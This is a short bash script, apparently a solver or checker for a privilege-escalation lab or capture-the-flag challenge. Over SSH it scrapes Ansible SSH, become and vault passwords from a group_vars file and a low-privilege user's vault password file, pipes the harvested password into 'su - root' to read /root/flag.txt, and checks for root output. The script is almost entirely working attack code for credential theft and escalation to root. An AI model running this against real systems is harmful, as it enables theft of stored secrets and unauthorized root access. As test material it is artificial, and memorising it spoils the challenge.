#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
PASS=$(awk "/ansible_ssh_pass|ansible_become_pass|vault/ {print \$NF}" /opt/ansible/group_vars_all.yml /home/lowpriv/.ansible/vault_pass.txt 2>/dev/null | head -1)
PASS=${PASS:-$(cat /home/lowpriv/.ansible/vault_pass.txt)}
printf "%s\n" "$PASS" | su - root -c "cat /root/flag.txt"
')"
assert_root_output "${out}"
